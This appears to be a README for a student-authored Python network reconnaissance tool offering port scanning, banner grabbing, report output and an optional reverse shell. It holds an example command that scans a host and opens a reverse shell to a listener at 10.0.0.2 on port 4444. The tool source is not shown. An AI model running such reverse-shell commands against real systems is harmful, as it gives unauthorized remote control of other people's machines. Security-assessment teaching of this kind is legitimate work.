# 🔍 Recon Tool

A lightweight Python-based network reconnaissance tool for port scanning, banner grabbing, and reverse shell deployment.

## ✨ Features

- **Port Scanning** – Scan a target IP or hostname against a custom list of ports.
- **Banner Grabbing** – Retrieve service banners from open ports (HTTP supported).
- **Reverse Shell** – Optionally establish a reverse shell connection to a remote listener.
- **Report Generation** – Automatically saves results to `discovery_report.txt`.

## 📦 Requirements

- Python 3.x
- Standard libraries: `socket`, `os`, `subprocess`, `argparse`, `sys`, `datetime`

No external dependencies required.

## 🚀 Usage

```bash
python recon_tool.py -t <TARGET> -w <PORT_WORDLIST> [--shell] [--lhost LHOST] [--lport LPORT]
Arguments
Argument	Description
-t, --target	Target IP address or hostname (required)
-w, --wordlist	File containing ports (one per line) (required)
--shell	Enable reverse shell after scan (optional)
--lhost	Listener IP for reverse shell
--lport	Listener port for reverse shell
Examples
Basic port scan:

bash
python recon_tool.py -t 192.168.1.1 -w ports.txt
Scan + reverse shell:

bash
python recon_tool.py -t 192.168.1.1 -w ports.txt --shell --lhost 10.0.0.2 --lport 4444
📄 Output
Console output shows open/closed ports and banners.

A file named discovery_report.txt is created with:

Scan timestamp

Port status (OPEN/CLOSED)

Grabbed banners

List of open ports

⚠️ Disclaimer
This tool is intended for authorized security assessments and educational purposes only. Unauthorized scanning of networks may violate laws and regulations. Use responsibly.

👨‍💻 Authors
Mohammad Mahmoud Daham

Sara Albasha

Zaid Al-Taqatqa

Omar Mansour